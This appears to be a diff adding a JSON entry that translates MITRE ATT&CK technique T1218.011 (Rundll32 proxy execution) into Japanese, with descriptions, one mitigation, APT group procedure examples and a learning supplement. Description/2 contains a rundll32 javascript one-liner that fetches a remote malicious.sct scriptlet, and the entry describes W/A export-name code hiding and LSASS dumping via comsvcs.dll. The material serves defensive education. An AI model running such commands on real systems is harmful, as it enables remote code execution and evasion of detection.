@@ -1,0 +1,48 @@
+{
+ "id": "T1218.011",
+ "source_sha": "ad782014036aa934",
+ "status": "done",
+ "seg": {
+  "name": "Rundll32",
+  "description/0": "攻撃者は、rundll32.exeを悪用して悪意あるコードの実行を代理させることがある。rundll32.exeを使うことで、直接実行する場合（Shared Modulesなど）とは異なり、許可リストや通常操作での誤検知のためにrundll32.exeプロセスの実行を監視していないセキュリティツールの検知を回避できることがある。Rundll32.exeは、一般にDLLペイロードの実行に関連付けられている（例：`rundll32.exe {DLLname, DLLfunction}`）。",
+  "description/1": "Rundll32.exeは、文書化されていないshell32.dllの関数`Control_RunDLL`と`Control_RunDLLAsUser`を通じて、コントロールパネルの項目ファイル（.cpl）を実行するためにも使われることがある。.cplファイルをダブルクリックすることでも、rundll32.exeが実行される。例えば、ClickOnceはRundll32.exeを経由して代理実行できる。",
+  "description/2": "Rundll32は、JavaScriptなどのスクリプトの実行にも使われることがある。これは、次のような構文で行うことができる：`rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")` この挙動は、Poweliksのようなマルウェアで使われているのが確認されている。",
+  "description/3": "脅威となる攻撃者は、悪意あるプログラムやスクリプトを間接的に実行するために、正規の署名済みシステムDLL（例：`zipfldr.dll, ieframe.dll`）を`rundll32.exe`とともに悪用することもあり、これにより自分たちの活動をより正規のものに見せかけ、検知を回避する。",
+  "description/4": "攻撃者は、rundll32.exeがDLLの関数名を読み込む方式を悪用することで、解析から悪意あるコードを隠そうとすることもある。さまざまな文字集合へのWindowsの互換性サポートの一部として、rundll32.exeは、指定された関数を読み込む前に、まずワイド／Unicode対応、次にANSI対応の関数を確認する（例：`rundll32.exe ExampleDLL.dll, ExampleFunction`というコマンドが与えられると、rundll32.exeはまず`ExampleFunctionW`の実行を試み、それが失敗すれば`ExampleFunctionA`を試し、それから`ExampleFunction`を読み込む）。そのため、攻撃者は同一の名前を持つ複数のエクスポート関数を作成し、無害な関数名に`W`や`A`を付け加えることで、悪意あるコードを隠すことができる。DLLの関数は、序数によってもエクスポート・実行できる（例：`rundll32.exe file.dll,#1`）。",
+  "description/5": "さらに、攻撃者は、悪意あるペイロードの実行をより隠すために、偽装（Masquerading）の技術（DLLファイル名・拡張子・関数名の変更など）を使うこともある。",
+  "mitigation/M1050/0": "Microsoftの拡張緩和策エクスペリエンスツールキット（EMET）の攻撃対象領域削減（ASR）機能を使って、rundll32.exeを使ってアプリケーション制御を回避する手法を遮断できる。",
+  "procedure/G0007/0": "APT28は、`rundll32.exe “C:\\Windows\\twain_64.dll”`のようなrundll32コマンドを使ってCHOPSTICKを実行した。APT28はまた、rundll32.exeを使って第一段階のドロッパー用の.dllを実行した。APT28のローダー型トロイの木馬は、rundll32を使ってDLLペイロードを実行するバッチスクリプトを保存した。",
+  "procedure/G0008/0": "Carbanakは、rundll32を通じて実行されるVNCサーバーソフトウェアをインストールする。",
+  "procedure/G0032/0": "Lazarus Groupは、侵害したホスト上で悪意あるペイロードを実行するためにrundll32を使用した。",
+  "procedure/G0034/0": "Sandworm Teamは、rundll32.exeを使って指定されたDLLを実行できるバックドアを使用した。",
+  "procedure/G0046/0": "FIN7は、侵害したネットワーク上でマルウェアを実行するために`rundll32.exe`を使用した。",
+  "procedure/G0047/0": "Gamaredon Groupのマルウェアは、追加の悪意ある構成要素を起動するためにrundll32を使用した。",
+  "procedure/G0050/0": "APT32のマルウェアは、初期感染処理を実行するためにrundll32.exeを使用した。",
+  "procedure/G0052/0": "CopyKittensは、横展開ツールのVminst、Cobalt Strike、シェルコードなど、被害者に対するさまざまなツールを読み込むためにrundll32を使用する。",
+  "procedure/G0059/0": "Magic Houndは、LSASSのメモリをダンプする際、comsvcs.dllからMiniDumpを実行するためにrundll32.exeを使用した。",
+  "procedure/G0069/0": "MuddyWaterは、レジストリのRunキーでrundll32.exeを利用して.dllを実行するマルウェアを使用した。",
+  "procedure/G0073/0": "APT19は、rundll32.exeに注入するようペイロードを構成した。",
+  "procedure/G0082/0": "APT38は、バイナリ・スクリプト・コントロールパネル項目ファイルを実行するため、またセキュリティツールの検知を回避するためにコードを代理実行するためにrundll32.exeを使用した。",
+  "procedure/G0092/0": "TA505は、悪意あるDLLを実行するために`rundll32.exe`を利用した。",
+  "procedure/G0094/0": "Kimsukyは、被害者のネットワーク上で悪意あるスクリプトとマルウェアを実行するために`rundll32.exe`を使用した。",
+  "procedure/G0096/0": "APT41は、ローダーを実行するためにrundll32.exeを使用した。",
+  "procedure/G0102/0": "Wizard Spiderは、WebDAVを使ってランサムウェアのコマンドを展開するために`rundll32.exe`を利用した。",
+  "procedure/G0108/0": "Blue Mockingbirdは、rundll32.exeを使ってカスタムコンパイルされたXMRIGマイナーDLLを実行した。",
+  "procedure/G0125/0": "HAFNIUMは、悪意あるDLLを読み込むために`rundll32`を使用した。",
+  "procedure/G0127/0": "TA551は、悪意あるDLLを読み込むためにrundll32.exeを使用した。",
+  "procedure/G0140/0": "LazyScripterは、Koadicのステージャーを実行するために`rundll32.exe`を使用した。",
+  "procedure/G0143/0": "Aquatic Pandaは、キーロガーのバイナリとして特定された悪意あるDLLファイルの実行を代理させるためにrundll32.exeを使用した。",
+  "procedure/G1034/0": "Daggerflyは、名前を変更したrundll32.exeバイナリを通じて悪意あるDLLの実行を代理させた。"
+ },
+ "supplement": {
+  "summary": "DLL実行の正規手段であるrundll32.exeを悪用する、極めて多くの攻撃グループ・マルウェアに使われている最も代表的なサブ技術の一つ。関数名の大文字小文字バリエーション(W/A接尾辞)を使ったコードの隠蔽という、特に巧妙な亜種も報告されている。",
+  "analogy": "荷物の配送ラベル（関数名）に「ExampleFunction」としか書いていなくても、配送係（rundll32.exe）はまず「ExampleFunctionW」、次に「ExampleFunctionA」という隠し部屋を確認してから配送する決まりになっている。攻撃者はこの隠し部屋に荷物を仕込むことで、通常のラベル確認だけでは気づかれない配送を実現する。",
+  "learn": [
+   "rundll32.exeが極めて多種多様な攻撃グループ・マルウェアの標準装備になっている、環境寄生型(LOLBins)の代表例であること",
+   "関数名のワイド／ANSI解決順序という、Windowsの文字集合互換性の仕組み自体が、コード隠蔽の手段として悪用され得ること"
+  ],
+  "interpretation": [
+   "本技術の実例数が95件（本データでは上位22件のみ訳出）という圧倒的な多さは、CAPECが示す「攻撃パターンの型」とATT&CKが示す「実際の使用実績」の違いを最もよく表している。rundll32.exeの悪用という一つの型が、ほぼすべての主要な攻撃グループ・マルウェアファミリーに共通して採用されているという事実は、単一の対策（例：rundll32.exeの遮断）が業務に与える影響の大きさと、それでも対策すべき優先度の高さの両方を物語っている。"
+  ]
+ }
+}
